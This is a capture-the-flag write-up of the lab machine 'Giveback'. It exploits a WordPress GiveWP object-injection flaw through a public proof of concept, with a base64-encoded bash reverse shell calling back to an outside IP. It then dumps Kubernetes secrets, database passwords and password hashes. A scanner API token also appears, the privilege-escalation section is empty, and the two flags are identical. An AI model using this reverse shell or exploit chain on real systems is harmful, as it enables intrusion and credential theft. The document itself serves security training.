---
layout: default
title: Giveback
---

## TL;DR



### Recon

we start with `nmap`, using this command:
```bash
nmap -p- -sVC --min-rate=10000 $target
```


We can see there are 3 open ports, port `22` for `ssh`, port `80` for wordpress server, and port `30686`, for golang http server.

```bash
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 66:f8:9c:58:f4:b8:59:bd:cd:ec:92:24:c3:97:8e:9e (ECDSA)
|_  256 96:31:8a:82:1a:65:9f:0a:a2:6c:ff:4d:44:7c:d3:94 (ED25519)
80/tcp    open  http    nginx 1.28.0
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: nginx/1.28.0
|_http-generator: WordPress 6.8.1
|_http-title: GIVING BACK IS WHAT MATTERS MOST &#8211; OBVI
30686/tcp open  http    Golang net/http server
|_http-title: Site doesn't have a title (application/json).
```

### Get shell using vulnerable plugin on wordpress server

We use `wpscan` to check for known vulnerabilites on the wordpress server, I used free token, you can easily generate one on the website of wpscan.
```bash
┌──(agonen㉿kali)-[~]
└─$ wpscan --url http://giveback.htb/ --api-token A84WpfaaDC3sbFc6WvqlVEvpe7hKJta06iTcavjE9Jw
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
 
[+] URL: http://giveback.htb/ [10.129.124.165]
[+] Started: Sat Nov  1 21:11:17 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: nginx/1.28.0
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://giveback.htb/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://giveback.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 6.8.1 identified (Insecure, released on 2025-04-30).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://giveback.htb/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=6.8.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://giveback.htb/, Match: 'WordPress 6.8.1'
 |

<REDACTED>

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

 |
 | [!] Title: GiveWP < 3.14.2 - Unauthenticated PHP Object Injection to RCE
 |     Fixed in: 3.14.2
 |     References:
 |      - https://wpscan.com/vulnerability/fdf7a98b-8205-4a29-b830-c36e1e46d990
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-5932
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/93e2d007-8157-42c5-92ad-704dc80749a3

```

Alright, we can see `CVE-2024-5932`, which leads to `RCE`. I Used this repo [https://github.com/EQSTLab/CVE-2024-5932](https://github.com/EQSTLab/CVE-2024-5932).

The reverse shell will be this, you can easily get it by typing `payloads` inside your `penelope`.
```bash
printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTYuMy80NDQ0IDA+JjEpICY=|base64 -d|bash
```

```bash
┌──(.venv)─(agonen㉿kali)-[~/htb/Giveback/CVE-2024-5932]
└─$ python3 CVE-2024-5932-rce.py -u http://giveback.htb/donations/the-things-we-need/ -c "printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTYuMy80NDQ0IDA+JjEpICY=|base64 -d|bash"
```



```bash
I have no name!@beta-vino-wp-wordpress-5c75b6d458-k2crp:/secrets/..2025_10_30_11_59_09.3808973577$ cat mariadb-password 
sW5sp4spa3u7RLyetrekE4oSI have no name!@beta-vino-wp-wordpress-5c75b6d458-k2crp:/secrets/..2025_10_30_11_59_09.3808973577$   
I have no name!@beta-vino-wp-wordpress-5c75b6d458-k2crp:/secrets/..2025_10_30_11_59_09.3808973577$ cat mariadb-root-password 
sW5sp4syetre32828383kE4oSI have no name!@beta-vino-wp-wordpress-5c75b6d458-k2crp:/secrets/..2025_10_30_11_59_09.3808973577$ 
I have no name!@beta-vino-wp-wordpress-5c75b6d458-k2crp:/secrets/..2025_10_30_11_59_09.3808973577$ cat wordpress-password 
O8F7KR5zGiI have no name!@beta-vino-wp-wordpress-5c75b6d458-k2crp:/secrets/..2025_10_30_11_59_09.3808973577$ 
```
mariadb:
```bash
sW5sp4spa3u7RLyetrekE4oS
```
mariadb-root:
```bash
sW5sp4syetre32828383kE4oS
```
wordpress:
```bash
O8F7KR5zGiI
```

```bash
I have no name!@beta-vino-wp-wordpress-5c75b6d458-k2crp:/bitnami/wordpress$ cat wp-config.php 
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'bitnami_wordpress' );

/** Database username */
define( 'DB_USER', 'bn_wordpress' );

/** Database password */
define( 'DB_PASSWORD', 'sW5sp4spa3u7RLyetrekE4oS' );

/** Database hostname */
define( 'DB_HOST', 'beta-vino-wp-mariadb:3306' );
```
```bash
I have no name!@beta-vino-wp-wordpress-5c75b6d458-k2crp:/bitnami/wordpress$ mysql -h beta-vino-wp-mariadb -u bn_wordpress -p
```


```sql
MariaDB [bitnami_wordpress]> select * from wp_users;
+----+------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email       | user_url         | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+--------------+
|  1 | user       | $P$Bm1D6gJHKylnyyTeT0oYNGKpib//vP. | user          | user@example.com | http://127.0.0.1 | 2024-09-21 22:18:28 |                     |           0 | babywyrm     |
+----+------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+--------------+
1 row in set (0.001 sec)
```

Then as root, with root password:
```bash
I have no name!@beta-vino-wp-wordpress-5c75b6d458-k2crp:/opt/bitnami/wordpress$ mysql -h beta-vino-wp-mariadb -u root -p
```
```sql
MariaDB [(none)]> select Host,User,Password from mysql.user;
+-----------+--------------+-------------------------------------------+
| Host      | User         | Password                                  |
+-----------+--------------+-------------------------------------------+
| localhost | mariadb.sys  |                                           |
| %         | root         | *4C01DD4201121A3DA72189DF846CC6E7ED7270D8 |
| %         | bn_wordpress | *1714DA168E455FA1E36940992C2DB095868C0FBF |
+-----------+--------------+-------------------------------------------+
3 rows in set (0.003 sec)
```

Also execute `env`, get a lot of staff.
### 

Maybe this can help?? 

[https://www.practical-devsecops.com/lesson-4-hacking-containers-like-a-boss/](https://www.practical-devsecops.com/lesson-4-hacking-containers-like-a-boss/)

### Privilege Escalation to Root


**User Flag:*****`b40abdfe23665f766f9c61ecba8a4c19`***

**Root Flag:*****`b40abdfe23665f766f9c61ecba8a4c19`***
